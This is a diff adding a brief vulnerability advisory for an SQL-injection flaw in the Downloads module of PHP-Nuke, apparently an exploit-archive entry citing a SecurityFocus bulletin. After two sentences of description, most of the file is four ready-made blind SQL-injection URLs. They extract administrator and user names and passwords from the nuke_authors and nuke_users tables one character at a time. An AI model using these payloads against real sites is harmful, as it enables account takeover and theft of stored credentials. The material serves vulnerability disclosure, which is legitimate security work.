@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/33410/info
+
+The Downloads module for PHP-Nuke is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Admin Username :
+http://www.example.com/[path]/modules.php?name=Downloads&d_op=Add&title=1&description=1&email=attacker@devil.net&&url=0%2F*%00*/'%20OR%20ascii(substring((select+a
+id+from+nuke_authors+limit+0,1),1,1))=ascii_code_try%2F*
+
+Admin Password :
+http://www.example.com/[path]/modules.php?name=Downloads&d_op=Add&title=1&description=1&email=attacker@devil.net&&url=0%2F*%00*/'%20OR%20ascii(substring((select+p
+wd+from+nuke_authors+limit+0,1),1,1))=ascii_code_try%2F*
+
+Users Username :
+http://www.example.com/[path]/modules.php?name=Downloads&d_op=Add&title=1&description=1&email=attacker@devil.net&&url=0%2F*%00*/'%20OR%20ascii(substring((select+u
+sername+from+nuke_users+limit+0,1),1,1))=ascii_code_try%2F*
+
+Users Password :
+http://www.example.com/[path]/modules.php?name=Downloads&d_op=Add&title=1&description=1&email=attacker@devil.net&&url=0%2F*%00*/'%20OR%20ascii(substring((select+u
+ser_password+from+nuke_users+limit+0,1),1,1))=ascii_code_try%2F* 
